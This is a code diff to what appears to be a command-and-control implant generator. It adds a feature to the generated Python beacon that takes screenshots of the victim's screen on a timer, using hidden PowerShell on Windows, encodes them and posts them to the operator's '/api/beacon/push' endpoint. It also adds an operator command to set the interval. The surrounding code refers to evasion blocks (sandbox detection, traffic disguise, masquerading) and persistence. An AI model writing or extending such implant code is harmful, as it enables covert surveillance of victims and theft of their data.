@@ -3242,6 +3242,64 @@ function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {
         return '\\n'.join(_res) or 'No files found.'
 ` : '';
 
+  const screenshotSchedSetupBlock = features.screenshotSched ? `
+_sched_interval = 0
+_sched_next = 0.0
+
+def _sched_shot():
+    import tempfile as _stmp, time as _st
+    tmp = _stmp.mktemp(suffix='.png')
+    try:
+        if _WIN:
+            ps_cmd = (
+                "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; "
+                "$s=[System.Windows.Forms.Screen]::PrimaryScreen; "
+                "$b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); "
+                "$g=[System.Drawing.Graphics]::FromImage($b); "
+                "$g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size); "
+                f"$b.Save('{tmp}')"
+            )
+            subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", ps_cmd], capture_output=True, timeout=15)
+        else:
+            try:
+                from PIL import ImageGrab
+                ImageGrab.grab().save(tmp, "PNG")
+            except ImportError:
+                subprocess.run(["scrot", tmp], capture_output=True, timeout=10)
+        with open(tmp, "rb") as f:
+            b64 = _b64.b64encode(f.read()).decode()
+        fname = "sched_" + str(int(_st.time())) + ".png"
+        _post(${xPy('/api/beacon/push')}, {"agent_id": AGENT_ID, "output": "__b64file__:" + fname + ":" + b64})
+    except: pass
+    finally:
+        try: os.remove(tmp)
+        except: pass
+
+def _sched_loop():
+    import time as _st
+    global _sched_next
+    while True:
+        _st.sleep(5)
+        if _sched_interval > 0 and _st.time() >= _sched_next:
+            _sched_next = _st.time() + _sched_interval * 60
+            _sched_shot()
+
+_th.Thread(target=_sched_loop, daemon=True).start()
+` : '';
+
+  const screenshotSchedCmdBlock = features.screenshotSched ? `
+    if cmd.startswith('screenshot_sched '):
+        global _sched_interval, _sched_next
+        try:
+            _n = int(cmd.split()[1])
+            if _n < 0: return 'Usage: screenshot_sched <minutes> (0 = stop)'
+            _sched_interval = _n
+            _sched_next = 0.0
+            return ('Screenshot schedule stopped.' if _n == 0 else f'Auto-screenshot every {_n} min. Use screenshot_sched 0 to stop.')
+        except (ValueError, IndexError):
+            return 'Usage: screenshot_sched <minutes> (0 = stop)'
+` : '';
+
   // ── Evasion code blocks ───────────────────────────────────────────────────
   const uaBlock = ev.traffic ? `
 _UA_POOL = [
@@ -3482,7 +3540,7 @@ def _save_cwd(p):
     except Exception:
         pass
 
-_cwd = _load_cwd()${uaBlock}${sandboxBlock}${bgBlock}${masqBlock}
+_cwd = _load_cwd()${uaBlock}${sandboxBlock}${bgBlock}${masqBlock}${screenshotSchedSetupBlock}
 ${persist ? `
 def _persist():
     try:
@@ -3738,7 +3796,7 @@ def run_command(cmd, task_id=None):
             return _jmod.dumps({"path": os.path.abspath(ls_path), "entries": entries})
         except Exception as _le:
             return f"Error: {_le}"
-${findBlock}
+${findBlock}${screenshotSchedCmdBlock}
     if cmd.startswith("shell "): cmd = cmd[6:]
 
     # Windows: handle 'cd' natively in Python to avoid cmd.exe trailing-backslash
